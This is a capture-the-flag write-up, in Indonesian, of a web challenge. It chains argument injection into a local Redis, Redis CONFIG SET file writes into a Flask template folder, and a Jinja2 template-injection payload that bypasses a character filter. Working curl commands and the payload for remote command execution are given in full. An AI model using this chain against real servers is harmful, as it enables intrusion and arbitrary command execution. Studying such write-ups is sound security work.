Writeup CTF: Whois (NoHackNoCtf - Web)

Target URL: http://182abac29e3244a197fbcfdaecb964f70.chal2.teagod.tech:8003

Vulnerability Vector: Server-Side Request Forgery (SSRF) via Redis Injection & Server-Side Template Injection (SSTI) in Python/Jinja2

Flag Obtained: NHNC{wH0is_t0_R3d1s_s5Rf_Tq9x_Z7mP_fa150e7ae20f40bab6707a8a6a1a9424}

1. Analisis Awal & Pemetaan Arsitektur

Endpoint /api/whois menerima parameter POST domain. Backend menggunakan parameter ini untuk menjalankan perintah WHOIS atau utilitas jaringan, namun terdapat celah injeksi argumen yang memungkinkan komunikasi langsung ke port lokal internal (Redis).

Vektor Masuk (SSRF Redis)

Dengan memanipulasi parameter domain, penyerang dapat mengirimkan perintah ke Redis lokal (127.0.0.1:6379):

curl -d "domain=-h 127.0.0.1 -p 6379 SET a test" "http://<target>/api/whois"


Respons +OK dari server memverifikasi bahwa argumen diteruskan langsung ke CLI Redis lokal, memberikan kendali penuh atas memori dan konfigurasi Redis.

Mekanisme Template Engine

Aplikasi memiliki endpoint /render?tpl=<filename> yang mencari berkas di direktori internal /app/tpl/<filename>.tpl dan merendernya menggunakan Flask (Jinja2).

2. Eksploitasi Rantai (Chaining) Redis ke SSTI

Untuk mengeksekusi kode, kita memindahkan direktori kerja Redis ke folder template aplikasi dan menulis berkas template kustom.

# 1. Ubah direktori kerja Redis ke folder template Flask
CONFIG SET dir /app/tpl

# 2. Aktifkan penulisan AOF (Append Only File) untuk redundansi
CONFIG SET appendonly yes

# 3. Ubah nama berkas database RDB ke target template 'hack.tpl'
CONFIG SET dbfilename hack.tpl


Pengujian awal dilakukan dengan menuliskan ekspresi matematika dasar {{7*7}} ke dalam memori Redis, diikuti dengan perintah SAVE untuk menulisnya ke disk:

SET a {{7*7}}
SAVE


Saat memanggil /render?tpl=hack, keluaran biner RDB memuat teks aof-preamble diikuti dengan hasil evaluasi 49. Hal ini memastikan bahwa:

Kita memiliki kemampuan menulis berkas sewenang-wenang (Arbitrary File Write).

Engine template yang digunakan aktif mengevaluasi ekspresi di dalam kurung kurawal ganda ({{ }}).

3. Analisis Filter & Bypass Input Jail

Backend mengimplementasikan filter karakter dan kata kunci (input jail) pada parameter input POST /api/whois. Berikut adalah proteksi yang terdeteksi beserta cara meloloskannya:

Proteksi / Filter

Status

Dampak pada SSTI

Teknik Bypass

Karakter " (Double Quotes)

Blocked

Tidak bisa mendeklarasikan string biasa

Menggunakan query parameter URL request.args

Karakter _ (Underscore)

Blocked

Tidak bisa memanggil objek internal seperti __globals__ atau __class__

Menggunakan filter `

Karakter [ dan ] (Square Brackets)

Blocked

Tidak bisa mengakses item dictionary obj['key']

Mengganti kurung siku dengan fungsi .get() atau filter `

Token globals

Blocked

Memblokir eksploitasi langsung via __globals__

Memindahkan string tersebut ke query parameter URL

Token read

Blocked

Memblokir pemanggilan fungsi pembacaan stdout .read()

Memindahkan metode pemanggilan ke URL

4. Konstruksi Payload SSTI Tanpa Underscore & Kurung Siku

Untuk mengeksekusi perintah shell, kita memanfaatkan fungsi global bawaan Jinja2: lipsum.
Eksploitasi standar Python Jinja2 untuk RCE biasanya berbentuk:

lipsum.__globals__['os'].popen('command').read()


Rekonstruksi Payload Langkah demi Langkah:

Bypass Underscore (_):
Alih-alih memanggil lipsum.__globals__, kita menggunakan filter |attr dengan string yang dilewatkan melalui query parameter URL request.args.a (di mana ?a=__globals__).

(lipsum|attr(request.args.a))


Bypass Kurung Siku ([]):
Karena __globals__ mengembalikan sebuah dictionary, kita tidak bisa mengekstrak modul os menggunakan kurung siku ['os']. Kita ganti dengan fungsi .get() bawaan dictionary:

(lipsum|attr(request.args.a)).get(request.args.b)  # b=os


Bypass Pemanggilan Atribut Modul:
Setelah mendapatkan modul os, kita perlu memanggil fungsi popen(). Karena os adalah modul (bukan dictionary), kita tidak bisa menggunakan .get(). Kita kembali menggunakan filter |attr untuk mengambil popen:

(lipsum|attr(request.args.a)).get(request.args.b)|attr(request.args.c)  # c=popen


Eksekusi & Bypass Token read:
Hasil eksekusi popen('command') berupa objek file stream yang membutuhkan fungsi .read() untuk mengambil hasilnya. Karena kata kunci read diblokir di POST, kita panggil secara dinamis menggunakan filter |attr dari parameter URL request.args.e (di mana ?e=read):

((lipsum|attr(request.args.a)).get(request.args.b)|attr(request.args.c)(request.args.d))|attr(request.args.e)()


Pengiriman Payload ke Redis (Bersih dari Spasi):

Karena CLI Redis memisahkan argumen berdasarkan spasi, seluruh payload Jinja2 dikemas rapat tanpa spasi di dalam tanda kurung kurawal {{}}:

curl -d "domain=-h 127.0.0.1 -p 6379 SET a {{((lipsum|attr(request.args.a)).get(request.args.b)|attr(request.args.c)(request.args.d))|attr(request.args.e)()}}" "http://182abac29e3244a197fbcfdaecb964f70.chal2.teagod.tech:8003/api/whois"


Tulis perubahan ke disk:

curl -d "domain=-h 127.0.0.1 -p 6379 SAVE" "http://182abac29e3244a197fbcfdaecb964f70.chal2.teagod.tech:8003/api/whois"


5. Eksekusi Perintah & Pengambilan Flag

Dengan payload jembatan dinamis yang sudah terpasang di hack.tpl, kita dapat mengirimkan perintah shell apa pun secara bebas melalui parameter URL GET /render.

Eksplorasi Direktori:

curl "http://182abac29e3244a197fbcfdaecb964f70.chal2.teagod.tech:8003/render?tpl=hack&a=__globals__&b=os&c=popen&d=ls%20-la%20/&e=read" --output -


Output mengonfirmasi keberadaan berkas biner /flag dan berkas teks /flag.txt di direktori root:

-rwsr-xr-x    1 root  root     16288 Jul  3 19:19 flag
-rw-r--r--    1 root  root        68 Jul  4 07:54 flag.txt


Membaca Flag:

Membaca isi berkas /flag.txt langsung ke terminal:

curl "http://182abac29e3244a197fbcfdaecb964f70.chal2.teagod.tech:8003/render?tpl=hack&a=__globals__&b=os&c=popen&d=cat%20/flag.txt&e=read" --output -


Hasil Render (Isi File):

NHNC{wH0is_t0_R3d1s_s5Rf_Tq9x_Z7mP_fa150e7ae20f40bab6707a8a6a1a9424}


Eksploitasi berhasil dilakukan secara penuh tanpa memicu filter keamanan backend.
